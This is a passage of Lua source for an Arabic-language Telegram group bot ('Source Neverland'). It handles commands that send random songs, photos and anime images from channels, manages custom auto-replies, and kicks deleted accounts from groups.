{{text = 'Channel Source ،',url="t.me/TEAM_Neverland"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/MemzDavid/'..Neverlandsong ..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source Neverland     --
if text == "تفعيل اغنيه" and Owner(msg)  then
local t = ' \n*✦┇تم تفعيل اغنيه*'
send(msg.chat_id_, msg.id_,t)
database:del(bot_id..'Neverland:aaqq:Neverland'..msg.chat_id_) 
end
if text == "تعطيل اغنيه" and Owner(msg)  then
local t = ' \n*✦┇تم تعطيل اغنيه*'
send(msg.chat_id_, msg.id_,t)
database:set(bot_id..'Neverland:aaqq:Neverland'..msg.chat_id_,true)  
end
if text == "اغنيه" and not database:get(bot_id..'Neverland:aaqq:Neverland'..msg.chat_id_)  then
Neverlandsong = math.random(2,1167); 
local Text ='*✦┇تم اختيار الاغنيه لك*'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Channel Source ،',url="t.me/TEAM_Neverland"}},
}
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token ..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/DavidMp3/'..Neverlandsong ..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source Neverland     --
if text == "تفعيل غنيلي" and Owner(msg)  then
local t = ' \n✦┇تم تفعيل غنيلي'
send(msg.chat_id_, msg.id_,t)
database:del(bot_id..'Neverland:Audios:Neverland'..msg.chat_id_) 
end
if text == "تعطيل غنيلي" and Owner(msg)  then
local t = ' \n✦┇تم تعطيل غنيلي'
send(msg.chat_id_, msg.id_,t)
database:set(bot_id..'Neverland:Audios:Neverland'..msg.chat_id_,true)  
end
if text == "غنيلي" and not database:get(bot_id..'Neverland:Audios:Neverland'..msg.chat_id_)  then
Neverlandsong = math.random(4,2824); 
local Text ='*✦┇تم اختيار المقطع الصوتي لك*'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Channel Source ،',url="t.me/TEAM_Neverland"}},
}
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/AudiosDavid/'..Neverlandsong..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source Neverland     --
if text == "تفعيل ريمكس" and Owner(msg)  or text == "تفعيل الريمكس" and Owner(msg)  then
local t = ' \n✦┇تم تفعيل الريمكس'
send(msg.chat_id_, msg.id_,t)
database:del(bot_id..'Neverland:Remix:Neverland'..msg.chat_id_) 
end
if text == "تعطيل ريمكس" and Owner(msg)  or text == "تعطيل الريمكس" and Owner(msg)  then
local t = ' \n✦┇تم تعطيل الريمكس'
send(msg.chat_id_, msg.id_,t)
database:set(bot_id..'Neverland:Remix:Neverland'..msg.chat_id_,true)  
end
if text == "ريمكس" and not database:get(bot_id..'Neverland:Remix:Neverland'..msg.chat_id_)  then
Neverlandsong = math.random(2,612); 
local Text ='*✦┇تم اختيار الريمكس لك*'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Channel Source ،',url="t.me/TEAM_Neverland"}},
}
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token ..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/RemixDavid/'..Neverlandsong ..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source Neverland     --
if text == "تفعيل صوره" and Owner(msg)  or text == "تفعيل الصوره" and Owner(msg)  then
local t = ' \n✦┇تم تفعيل الصوره'
send(msg.chat_id_, msg.id_,t)
database:del(bot_id..'Neverland:Photo:Neverland'..msg.chat_id_) 
end
if text == "تعطيل صوره" and Owner(msg)  or text == "تعطيل الصوره" and Owner(msg)  then
local t = ' \n✦┇تم تعطيل الصوره'
send(msg.chat_id_, msg.id_,t)
database:set(bot_id..'Neverland:Photo:Neverland'..msg.chat_id_,true)  
end
if text == "صوره" and not database:get(bot_id..'Neverland:Photo:Neverland'..msg.chat_id_)  then
Neverlandsong = math.random(4,1171); 
local Text ='*✦┇تم اختيار الصوره لك*'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Channel Source ،',url="t.me/TEAM_Neverland"}},
}
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token ..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/PhotosDavid/'..Neverlandsong ..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source Neverland     --
if text == "تفعيل انمي" and Owner(msg)  or text == "تفعيل الانمي" and Owner(msg)  then
local t = ' \n✦┇تم تفعيل الانمي'
send(msg.chat_id_, msg.id_,t)
database:del(bot_id..'Neverland:Anime:Neverland'..msg.chat_id_) 
end
if text == "تعطيل انمي" and Owner(msg)  or text == "تعطيل الانمي" and Owner(msg)  then
local t = ' \n✦┇تم تعطيل الانمي'
send(msg.chat_id_, msg.id_,t)
database:set(bot_id..'Neverland:Anime:Neverland'..msg.chat_id_,true)  
end
if text == "انمي" and not database:get(bot_id..'Neverland:Anime:Neverland'..msg.chat_id_)  then
Neverlandsong = math.random(3,1002); 
local Text ='*✦┇تم اختيار صورة الانمي لك*'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Channel Source ،',url="t.me/TEAM_Neverland"}},
}
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token ..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/AnimeDavid/'..Neverlandsong ..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source Neverland     --
if text == "تفعيل فلم" and Owner(msg)  then
local t = ' \n✦┇تم تفعيل الافلام'
send(msg.chat_id_, msg.id_,t)
database:del(bot_id..'Neverland:Movies:Neverland'..msg.chat_id_) 
end
if text == "تعطيل فلم" and Owner(msg)  then
local t = ' \n✦┇تم تعطيل الافلام'
send(msg.chat_id_, msg.id_,t)
database:set(bot_id..'Neverland:Movies:Neverland'..msg.chat_id_,true)  
end
if text == "فلم" and not database:get(bot_id..'Neverland:Movies:Neverland'..msg.chat_id_)  then
Neverlandsong = math.random(45,125); 
local Text ='*✦┇تم اختيار الفلم لك*'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Channel Source ،',url="t.me/TEAM_Neverland"}},
}
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token ..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/MoviesDavid/'..Neverlandsong ..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source Neverland     --
if text == "تفعيل مسلسل" and Owner(msg)  then
local t = ' \n✦┇تم تفعيل المسلسلات'
send(msg.chat_id_, msg.id_,t)
database:del(bot_id..'Neverland:Series:Neverland'..msg.chat_id_) 
end
if text == "تعطيل مسلسل" and Owner(msg)  then
local t = ' \n✦┇تم تعطيل المسلسلات'
send(msg.chat_id_, msg.id_,t)
database:set(bot_id..'Neverland:Series:Neverland'..msg.chat_id_,true)  
end
if text == "مسلسل" and not database:get(bot_id..'Neverland:Series:Neverland'..msg.chat_id_)  then
Neverlandsong = math.random(2,54); 
local Text ='*✦┇تم اختيار المسلسل لك*'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Channel Source ،',url="t.me/TEAM_Neverland"}},
}
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token ..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SeriesDavid/'..Neverlandsong ..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end


if text == 'الردود' or text == 'ردود المدير' and Owner(msg) then
local list = database:smembers(bot_id.."Neverland:List:Manager"..msg.chat_id_)
if #list == 0 then
text = "✦┇لا يوجد ردود للمدير"
return send(msg.chat_id_, msg.id_,"["..text.."]")
end
local texte = '- ردود المجموعه'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'المتحركه', callback_data=msg.sender_user_id_.."/delereplygif"},{text = 'الكلمات', callback_data=msg.sender_user_id_.."/delereplytext"},
},
{
{text = 'الملصقات', callback_data=msg.sender_user_id_.."/delereplystickar"},{text = 'الصوت', callback_data=msg.sender_user_id_.."/delereplyogg"},
},
{
{text = 'MP3', callback_data=msg.sender_user_id_.."/delereplymp3"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(texte).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end


if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
local test = database:get(bot_id.."Neverland:Text:Manager"..msg.sender_user_id_..":"..msg.chat_id_.."")
if database:get(bot_id.."Neverland:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:del(bot_id.."Neverland:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_)
if msg.content_.sticker_ then   
database:set(bot_id.."Neverland:Add:Rd:Manager:Stekrs"..test..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
database:set(bot_id.."Neverland:Add:Rd:Manager:Vico"..test..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
database:set(bot_id.."Neverland:Add:Rd:Manager:Gif"..test..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."Neverland:Add:Rd:Manager:Text"..test..msg.chat_id_, text)  
end  
if msg.content_.audio_ then
database:set(bot_id.."Neverland:Add:Rd:Manager:Audio"..test..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
database:set(bot_id.."Neverland:Add:Rd:Manager:File"..test..msg.chat_id_, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
database:set(bot_id.."Neverland:Add:Rd:Manager:Video"..test..msg.chat_id_, msg.content_.video_.video_.persistent_id_)  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
database:set(bot_id.."Neverland:Add:Rd:Manager:Photo"..test..msg.chat_id_, photo_in_group)  
end
send(msg.chat_id_, msg.id_,"✦┇تم حفظ الرد في المجموعة")
return false  
end  
end
if text == "اضف رد" and Owner(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:set(bot_id.."Neverland:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
_key = {
{{text="الغاء",callback_data="delrd"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_," *✦┇الان ارسل الرد الذي تريد وضعة*",_key,msg.id_)
return false
end
if text == "حذف رد" and Owner(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
send(msg.chat_id_, msg.id_,"✦┇الان ارسل الرد الذي تريد حذفة")
database:set(bot_id.."Neverland:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,"true2")
return false 
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."Neverland:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '✦┇الان ارسل الرد الذي تريد اضافته \n✦┇قد يكون (ملف - فديو - نص - ملصق - بصمه - متحركه )\n✦┇يمكنك اضافه الى النص :\n- `#username` > اسم المستخدم\n- `#msgs` > عدد رسائل المستخدم\n- `#name` > اسم المستخدم\n- `#id` > ايدي المستخدم\n- `#stast` > موقع المستخدم \n- `#edit` > عدد السحكات ')
database:set(bot_id.."Neverland:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,"true1")
database:set(bot_id.."Neverland:Text:Manager"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:del(bot_id.."Neverland:Add:Rd:Manager:Vico"..text..msg.chat_id_)   
database:del(bot_id.."Neverland:Add:Rd:Manager:Text"..text..msg.chat_id_)   
database:del(bot_id.."Neverland:Add:Rd:Manager:File"..text..msg.chat_id_)
database:del(bot_id.."Neverland:Add:Rd:Manager:Audio"..text..msg.chat_id_)
database:sadd(bot_id.."Neverland:List:Manager"..msg.chat_id_.."", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."Neverland:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_.."") == "true2" then
send(msg.chat_id_, msg.id_,"✦┇تم ازالة الرد من قائمه الردود")
database:del(bot_id.."Neverland:Add:Rd:Manager:Gif"..text..msg.chat_id_)   
database:del(bot_id.."Neverland:Add:Rd:Manager:Vico"..text..msg.chat_id_)   
database:del(bot_id.."Neverland:Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
database:del(bot_id.."Neverland:Add:Rd:Manager:Text"..text..msg.chat_id_)   
database:del(bot_id.."Neverland:Add:Rd:Manager:Photo"..text..msg.chat_id_)
database:del(bot_id.."Neverland:Add:Rd:Manager:Video"..text..msg.chat_id_)
database:del(bot_id.."Neverland:Add:Rd:Manager:File"..text..msg.chat_id_)
database:del(bot_id.."Neverland:Add:Rd:Manager:Audio"..text..msg.chat_id_)
database:del(bot_id.."Neverland:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."Neverland:List:Manager"..msg.chat_id_.."", text)
return false
end
end
if text and not database:get(bot_id.."Neverland:Reply:Manager"..msg.chat_id_) then
if not database:sismember(bot_id..'Neverland:Spam:Group'..msg.sender_user_id_,text) then
local veico = database:get(bot_id.."Neverland:Add:Rd:Manager:Vico"..text..msg.chat_id_)   
local Text = database:get(bot_id.."Neverland:Add:Rd:Manager:Text"..text..msg.chat_id_)   
local document = database:get(bot_id.."Neverland:Add:Rd:Manager:File"..text..msg.chat_id_)
local audio = database:get(bot_id.."Neverland:Add:Rd:Manager:Audio"..text..msg.chat_id_)
if Text then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,data)
local NumMsg = database:get(bot_id..'Neverland:messageUser'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = Get_Rank(msg.sender_user_id_,msg.chat_id_)
local message_edit = database:get(bot_id..'Neverland:message_edit'..msg.chat_id_..msg.sender_user_id_) or 0
local Text = Text:gsub('#username',(data.username_ or 'لا يوجد')) 
local Text = Text:gsub('#name',data.first_name_)
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',message_edit)
local Text = Text:gsub('#msgs',NumMsg)
local Text = Text:gsub('#stast',Status_Gps)
send(msg.chat_id_, msg.id_,'['..Text..']')
database:sadd(bot_id.."Neverland:Spam:Group"..msg.sender_user_id_,text) 
end,nil)
end
if veico then 
sendVoice(msg.chat_id_, msg.id_,veico,"")
database:sadd(bot_id.."Neverland:Spam:Group"..msg.sender_user_id_,text) 
end
if video then 
sendVideo(msg.chat_id_, msg.id_,video,"")
database:sadd(bot_id.."Neverland:Spam:Group"..msg.sender_user_id_,text) 
end
if anemi then 
sendAnimation(msg.chat_id_, msg.id_,anemi,"")   
database:sadd(bot_id.."Neverland:Spam:Group"..msg.sender_user_id_,text) 
end
if document then
sendDocument(msg.chat_id_, msg.id_, document)   
database:sadd(bot_id.."Neverland:Spam:Group"..msg.sender_user_id_,text) 
end  
if audio then
sendAudio(msg.chat_id_,msg.id_,audio)  
database:sadd(bot_id.."Neverland:Spam:Group"..msg.sender_user_id_,text) 
end
if photo then
sendPhoto(msg.chat_id_,msg.id_,photo,photo_caption)
database:sadd(bot_id.."Neverland:Spam:Group"..msg.sender_user_id_,text) 
end  
end
end
------------------------------------------------------------------------
if text == ("مسح ردود المطور") and DevNeverland(msg) then 
local list = database:smembers(bot_id.."Neverland:List:Rd:Sudo")
for k,v in pairs(list) do
database:del(bot_id.."Neverland:Add:Rd:Sudo:Gif"..v)   
database:del(bot_id.."Neverland:Add:Rd:Sudo:vico"..v)   
database:del(bot_id.."Neverland:Add:Rd:Sudo:stekr"..v)     
database:del(bot_id.."Neverland:Add:Rd:Sudo:Text"..v)   
database:del(bot_id.."Neverland:Add:Rd:Sudo:Photo"..v)
database:del(bot_id.."Neverland:Add:Rd:Sudo:Video"..v)
database:del(bot_id.."Neverland:Add:Rd:Sudo:File"..v)
database:del(bot_id.."Neverland:Add:Rd:Sudo:Audio"..v)
database:del(bot_id.."Neverland:List:Rd:Sudo")
end
send(msg.chat_id_, msg.id_,"✦┇تم ازالة ردود المطور")
end
if text == ("ردود المطور") and DevNeverland(msg) then 
local list = database:smembers(bot_id.."Neverland:List:Rd:Sudo")
text = "\n✦┇قائمة ردود المطور \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
if database:get(bot_id.."Neverland:Add:Rd:Sudo:Gif"..v) then
db = "متحركه 🎭"
elseif database:get(bot_id.."Neverland:Add:Rd:Sudo:vico"..v) then
db = "بصمه 📢"
elseif database:get(bot_id.."Neverland:Add:Rd:Sudo:stekr"..v) then
db = "ملصق ✦┇"
elseif database:get(bot_id.."Neverland:Add:Rd:Sudo:Text"..v) then
db = "رساله ✉"
elseif database:get(bot_id.."Neverland:Add:Rd:Sudo:Photo"..v) then
db = "صوره ✦┇"
elseif database:get(bot_id.."Neverland:Add:Rd:Sudo:Video"..v) then
db = "فيديو 📹"
elseif database:get(bot_id.."Neverland:Add:Rd:Sudo:File"..v) then
db = "ملف ✦┇"
elseif database:get(bot_id.."Neverland:Add:Rd:Sudo:Audio"..v) then
db = "اغنيه 🎵"
end
text = text..""..k.." >> ("..v..") ↜ {"..db.."}\n"
end
if #list == 0 then
text = "✦┇لا يوجد ردود للمطور"
end
send(msg.chat_id_, msg.id_,"["..text.."]")
end
if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
local test = database:get(bot_id.."Neverland:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."Neverland:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:del(bot_id.."Neverland:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_)
if msg.content_.sticker_ then   
database:set(bot_id.."Neverland:Add:Rd:Sudo:stekr"..test, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
database:set(bot_id.."Neverland:Add:Rd:Sudo:vico"..test, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
database:set(bot_id.."Neverland:Add:Rd:Sudo:Gif"..test, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."Neverland:Add:Rd:Sudo:Text"..test, text)  
end  
if msg.content_.audio_ then
database:set(bot_id.."Neverland:Add:Rd:Sudo:Audio"..test, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
database:set(bot_id.."Neverland:Add:Rd:Sudo:File"..test, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
database:set(bot_id.."Neverland:Add:Rd:Sudo:Video"..test, msg.content_.video_.video_.persistent_id_)  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
database:set(bot_id.."Neverland:Add:Rd:Sudo:Photo"..test, photo_in_group)  
end
send(msg.chat_id_, msg.id_,"✦┇تم حفظ الرد في المجموعة")
return false  
end  
end

if text == "اضف رد للكل" and DevNeverland(msg) then 
send(msg.chat_id_, msg.id_,"✦┇الان ارسل الرد الذي تريد وضعة")
database:set(bot_id.."Neverland:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
return false 
end
if text == "حذف رد للكل" and DevNeverland(msg) then 
send(msg.chat_id_, msg.id_,"✦┇الان ارسل الرد الذي تريد حذفة")
database:set(bot_id.."Neverland:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return false 
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."Neverland:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '✦┇الان ارسل الرد الذي تريد اضافته \n✦┇قد يكون (ملف - فديو - نص - ملصق - بصمه - متحركه )\n✦┇يمكنك اضافه الى النص :\n- `#username` > اسم المستخدم\n- `#msgs` > عدد رسائل المستخدم\n- `#name` > اسم المستخدم\n- `#id` > ايدي المستخدم\n- `#stast` > موقع المستخدم \n- `#edit` > عدد السحكات ')
database:set(bot_id.."Neverland:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."Neverland:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."Neverland:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."Neverland:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"✦┇تم ازالة الرد من قائمه ردود المطور")
list = {"Add:Rd:Sudo:Audio","Add:Rd:Sudo:File","Add:Rd:Sudo:Video","Add:Rd:Sudo:Photo","Add:Rd:Sudo:Text","Add:Rd:Sudo:stekr","Add:Rd:Sudo:vico","Add:Rd:Sudo:Gif"}
for k,v in pairs(list) do
database:del(bot_id..'Neverland:'..v..text)
end
database:del(bot_id.."Neverland:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."Neverland:List:Rd:Sudo", text)
return false
end
end

if text and not database:get(bot_id.."Neverland:Reply:Sudo"..msg.chat_id_) then
if not database:sismember(bot_id..'Neverland:Spam:Group'..msg.sender_user_id_,text) then
local anemi = database:get(bot_id.."Neverland:Add:Rd:Sudo:Gif"..text)   
local veico = database:get(bot_id.."Neverland:Add:Rd:Sudo:vico"..text)   
local stekr = database:get(bot_id.."Neverland:Add:Rd:Sudo:stekr"..text)     
local Text = database:get(bot_id.."Neverland:Add:Rd:Sudo:Text"..text)   
local photo = database:get(bot_id.."Neverland:Add:Rd:Sudo:Photo"..text)
local video = database:get(bot_id.."Neverland:Add:Rd:Sudo:Video"..text)
local document = database:get(bot_id.."Neverland:Add:Rd:Sudo:File"..text)
local audio = database:get(bot_id.."Neverland:Add:Rd:Sudo:Audio"..text)

if Text then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,data)
local NumMsg = database:get(bot_id..'Neverland:messageUser'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = Get_Rank(msg.sender_user_id_,msg.chat_id_)
local message_edit = database:get(bot_id..'Neverland:message_edit'..msg.chat_id_..msg.sender_user_id_) or 0
local Text = Text:gsub('#username',(data.username_ or 'لا يوجد')) 
local Text = Text:gsub('#name',data.first_name_)
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',message_edit)
local Text = Text:gsub('#msgs',NumMsg)
local Text = Text:gsub('#stast',Status_Gps)
send(msg.chat_id_, msg.id_,Text)
database:sadd(bot_id.."Neverland:Spam:Group"..msg.sender_user_id_,text) 
end,nil)
end
if stekr then 
sendSticker(msg.chat_id_,msg.id_,stekr) 
database:sadd(bot_id.."Neverland:Spam:Group"..msg.sender_user_id_,text) 
end
if veico then 
sendVoice(msg.chat_id_, msg.id_,veico,"")
database:sadd(bot_id.."Neverland:Spam:Group"..msg.sender_user_id_,text) 
end
if video then 
sendVideo(msg.chat_id_, msg.id_,video,"")
database:sadd(bot_id.."Neverland:Spam:Group"..msg.sender_user_id_,text) 
end
if anemi then 
sendAnimation(msg.chat_id_, msg.id_,anemi,"")   
database:sadd(bot_id.."Neverland:Spam:Group"..msg.sender_user_id_,text) 
end
if document then
sendDocument(msg.chat_id_, msg.id_, document)     
database:sadd(bot_id.."Neverland:Spam:Group"..msg.sender_user_id_,text) 
end  
if audio then
sendAudio(msg.chat_id_,msg.id_,audio)  
database:sadd(bot_id.."Neverland:Spam:Group"..msg.sender_user_id_,text) 
end
if photo then
sendPhoto(msg.chat_id_,msg.id_,photo,"")
database:sadd(bot_id.."Neverland:Spam:Group"..msg.sender_user_id_,text) 
end  
end
end
if text == 'طرد المحذوفين' or text == 'مسح المحذوفين' then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if Addictive(msg) then    
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),offset_ = 0,limit_ = 1000}, function(arg,del)
for k, v in pairs(del.members_) do
tdcli_function({ID = "GetUser",user_id_ = v.user_id_},function(b,data) 
if data.first_name_ == false then
Kick_Group(msg.chat_id_, data.id_)
end
end,nil)
end
send(msg.chat_id_, msg.id_,'✦┇تم طرد الحسابات المحذوفه')
end,nil)
end
end

if text == "تفعيل ردود المدير" and Owner(msg) then   
database:del(bot_id.."Neverland:Reply:Manager"..msg.chat_id_)  
send(msg.chat_id_, msg.id_,"✦┇تم تفعيل ردود المدير") 
end
if text == "تعطيل ردود المدير" and Owner(msg) then  
database:set(bot_id.."Neverland:Reply:Manager"..msg.chat_id_,true)  
send(msg.chat_id_, msg.id_,"✦┇تم تعطيل ردود المدير" ) 
end
if text == "تفعيل ردود المطور" and Owner(msg) then   
database:del(bot_id.."Neverland:Reply:Sudo"..msg.chat_id_)  
send(msg.chat_id_, msg.id_,"✦┇تم تفعيل ردود المطور" ) 
end
if text == "تعطيل ردود المطور" and Owner(msg) then  
database:set(bot_id.."Neverland:Reply:Sudo"..msg.chat_id_,true)   
send(msg.chat_id_, msg.id_,"✦┇تم تعطيل ردود المطور" ) 
end


